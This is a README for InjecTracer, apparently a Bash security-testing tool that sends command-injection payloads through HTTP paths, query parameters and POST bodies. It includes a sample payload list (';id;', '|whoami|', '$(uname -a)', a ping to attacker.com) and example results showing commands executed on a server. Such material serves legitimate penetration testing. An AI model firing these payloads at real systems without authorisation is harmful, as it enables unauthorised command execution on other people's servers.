
# InjecTracer

**InjecTracer** is a lightweight Bash-based injection payload tracer for testing command injection and other vulnerabilities via GET and POST HTTP methods. It supports dynamic payload injection via path, parameters, or POST body, and saves the results in structured JSON format.

---

## 🚀 Features

- Accepts inputs via `input.json`
- Supports GET and POST methods
- Injects payloads in:
  - Path (URL with `INJECT_HERE`)
  - Query parameters
  - POST body (form-style)
- Adds headers from input
- Uses `curl` for HTTP requests
- Extracts output from `<pre>` tags or raw body
- Outputs results to `results.json`

---

## 📂 File Structure

```
InjecTracer/
├── InjecTracer.sh       # Main script
├── input.json           # Input configuration
├── payloads.txt         # List of payloads to inject
└── results.json         # Output results in JSON
```

---

## 📥 Example: input.json

```json
{
  "method": "POST",
  "url": "http://example.com/submit",
  "headers": {
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "InjecTracerBot/1.0"
  },
  "body": {
    "email": "test@INJECT_HERE.com",
    "name": "user"
  }
}
```

### For GET request with path injection:

```json
{
  "method": "GET",
  "url": "http://example.com/INJECT_HERE",
  "headers": {
    "User-Agent": "InjecTracerBot/1.0"
  }
}
```

---

## 🧨 Example: payloads.txt

```
;id;
|whoami|
$(uname -a)
`ls`
& ping -c 1 attacker.com &
```

---

## 📤 Example: results.json

```json
[
  {
    "payload": ";id;",
    "url": "http://example.com/submit",
    "location": "body",
    "output": "uid=33(www-data) gid=33(www-data) groups=33(www-data)"
  },
  {
    "payload": "|whoami|",
    "url": "http://example.com/submit",
    "location": "body",
    "output": "www-data"
  }
]
```

---

## ✅ Usage

1. **Place your payloads in** `payloads.txt`
2. **Edit** `input.json` to match the request details
3. **Run the script:**

```bash
chmod +x InjecTracer.sh
./InjecTracer.sh
```

4. **Check the output:**

```bash
cat results.json | jq
```

---

## 🛠 Dependencies

- `jq`
- `curl`
- `sed`, `perl` (for response parsing)

Install on Debian-based system:

```bash
sudo apt update
sudo apt install jq curl
```

---

## 🧑‍💻 Author

**Amal P.**  
Cybersecurity Researcher  
🔍 Focus: Injection Testing, Automation Tools, DNS-Based Detection  

---

## 📄 License

MIT License – Free to use and modify.

---

## 📣 Notes

- Ensure the target accepts requests and returns meaningful output in `<pre>` or readable format.
- Tool does **not** follow redirects automatically; modify `curl` flags if needed.
